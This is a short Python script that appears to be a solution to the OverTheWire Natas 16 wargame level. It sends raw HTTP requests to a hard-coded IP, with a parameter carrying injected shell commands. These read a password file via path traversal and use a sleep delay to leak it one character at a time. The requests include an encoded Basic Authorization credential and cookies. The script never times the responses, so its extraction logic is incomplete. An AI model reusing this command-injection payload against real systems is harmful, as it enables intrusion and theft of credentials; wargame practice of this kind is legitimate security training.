import socket

words = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+="
for word in words:
    send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    send.connect(("178.79.134.250", 80))
    data = (b"GET /?needle=%24(if+[+" + word.encode() + b"+=+%24(arr=(%24(cat+../../../../../../../etc/natas_webpass/natas17))%0d%0aword=%24{arr[0]}%0d%0aecho+%24{word%3a0%3a1})+]%0d%0athen%0d%0asleep+100%0d%0afi " + b"HTTP/1.1\r\n")
    data += b"Host: natas16.natas.labs.overthewire.org\r\n"
    data += b"Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n"
    data += b"Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\r\n"
    data += b"\r\n"
    send.send(data)
    recv = send.recv(1500)
    print(word)
    send.close()
